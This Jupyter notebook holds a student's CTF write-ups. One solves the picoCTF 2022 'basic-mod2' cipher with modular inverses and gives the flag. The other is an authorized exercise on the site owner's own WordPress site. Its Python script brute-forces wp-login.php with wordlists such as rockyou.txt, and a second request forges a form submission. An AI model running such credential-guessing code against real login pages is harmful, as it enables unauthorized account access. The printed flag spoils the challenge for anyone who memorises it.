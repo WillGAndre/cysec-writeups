{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Group A\n",
    "# Guilherme Pereira"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# picoCTF 2022 - basic-mod2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "alpha = list(map(chr, range(ord('a'), ord('z')+1)))\n",
    "f = open(\"message.txt\", \"r\")\n",
    "lines = f.readlines()[0]\n",
    "res = \"\"\n",
    "for l in lines.split():\n",
    "    r = pow(int(l), -1, 41)\n",
    "\n",
    "    if r in range(1, 27):\n",
    "        res += alpha[r-1]\n",
    "    elif r in range(27, 37):\n",
    "        dig = r - 27\n",
    "        res += str(dig)\n",
    "    else:\n",
    "        res += \"_\"\n",
    "print(res)\n",
    "# picoCTF{1nv3r53ly_h4rd_c680bdc1}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# H4K1NG Challenge:\n",
    "Please try to use psswrd 4ttk on this website. This website is mine and I allow you to run this only for educational purposes. DO NOT use this on any other website without permission or you can go to jail.\n",
    "\n",
    "There is a weak username, intentionally made this way. Try to see if you can figure the password out.\n",
    "\n",
    "The username is: cybersecurity\n",
    "\n",
    "After successfully entering the website, you will be redirected to the home page, then you can click on a button named \"Go to submit page\" and by doing that you will be redirected to another page where you can submit your name. Click on \"Submit Your Name\", upon clicking, you would be asked to put your name there and then submit. At last, you can logout and be done with this challenge."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Initially I started the challenge with a brute force attack under the domain https://rs11.glorifykickstarter.com/wp-login.php. For this task I used the \"rockyou.txt\" and two simple password wordlists. Although, brute forcing was infeasible since after several consecutive atempts the server would automatically raise a 406 HTTP status code (Not Acceptable), essentially applying a time constraint with each login attempt. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Code used to brute force wordpress login\n",
    "from os.path import isfile, join\n",
    "from os import listdir\n",
    "import requests\n",
    "\n",
    "wp_login = 'https://rs11.glorifykickstarter.com/wp-login.php'\n",
    "wp_admin = 'https://rs11.glorifykickstarter.com/wp-admin/'\n",
    "username = 'cybersecurity'\n",
    "PSSWD_PATH = \"passwd/\"\n",
    "password_files = [f for f in listdir(PSSWD_PATH) if isfile(join(PSSWD_PATH, f))]\n",
    "\n",
    "def loop():\n",
    "    with requests.Session() as s:\n",
    "        for f in password_files:\n",
    "            plist = open(PSSWD_PATH+f, \"r\")\n",
    "            for pwd in plist.readlines():\n",
    "                req(s, pwd)\n",
    "\n",
    "def req(s, pwd):\n",
    "    headers = {\n",
    "        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',\n",
    "    }\n",
    "    data = {\n",
    "        'log': username, 'pwd': pwd, 'wp-submit': 'Log In',\n",
    "        'redirect_to': wp_admin\n",
    "    }\n",
    "    r = s.post(wp_login, headers=headers, data=data, allow_redirects=False)\n",
    "\n",
    "    if r.status_code in [302, 303]:\n",
    "        print(\"hit\")\n",
    "    elif r.status_code == 200:\n",
    "        print(\"no hit\")\n",
    "    else:\n",
    "        print(\"error\")\n",
    "\n",
    "    print(\"status: \" + str(r.status_code) +\" ; passwd: \" + pwd)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "After further analysis of the WordPress website, embedded JavaScript code was found in the /names_cs index (HTML) page. This code renders the popup used to submit our name, using the \"form\" tags. By copying the returned \"form\" tags into a new HTML index page and analyzing the code, it was verifiable that if somehow we could replicate this form submit then a single POST method could be sent to https://rs11.glorifykickstarter.com/names_cs/ with the respective body parameters and my name would be present in the database. In this POST method, my name was wrapped around the 'mf-names' field, since this was the input (div) name in the respective form."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def single():\n",
    "    with requests.Session() as s:\n",
    "        names_cs_post(s)\n",
    "\n",
    "    # Not a GET request since names_cs page has submit button (embedded html) within form.\n",
    "    # Form sends POST request on submit, assuming ` onSubmit=${ validation.handleSubmit( parent.handleFormSubmit ) } ` -> is a POST method.\n",
    "def names_cs_post(s):\n",
    "    headers = {\n",
    "        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0',\n",
    "    }\n",
    "    data = {\n",
    "        'mf-names': 'Guilherme Pereira'\n",
    "    }\n",
    "    r = s.post('https://rs11.glorifykickstarter.com/names_cs', headers=headers, data=data, allow_redirects=False)\n",
    "    \n",
    "    print(\"response cookies: \" + str(r.cookies))\n",
    "    print(\"\\t---\")\n",
    "    print(\"headers: \" + str(r.headers))\n",
    "    print(\"\\t---\")\n",
    "    print(\"status: \" + str(r.status_code))\n",
    "\n",
    "    ch = input(\"Parse HTML ? (y)\\t\")\n",
    "    if ch == 'y':\n",
    "        parse_html(r)\n",
    "\n",
    "def parse_html(r):\n",
    "    from bs4 import BeautifulSoup\n",
    "\n",
    "    c = r.content\n",
    "    soup = BeautifulSoup(c, 'html.parser')\n",
    "    print(soup)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "References:\n",
    "    -   https://stackoverflow.com/questions/42002336/using-python-requests-module-to-login-on-an-wordpress-based-website\n",
    "    -   https://stackoverflow.com/questions/42596483/how-to-login-to-wordpress-with-python-with-requests\n",
    "    -   https://stackoverflow.com/questions/43562550/login-wordpress-with-requests-python3"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.13 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.6"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "b0fa6594d8f4cbf19f97940f81e996739fb7646882a419484c72d19e05852a7e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
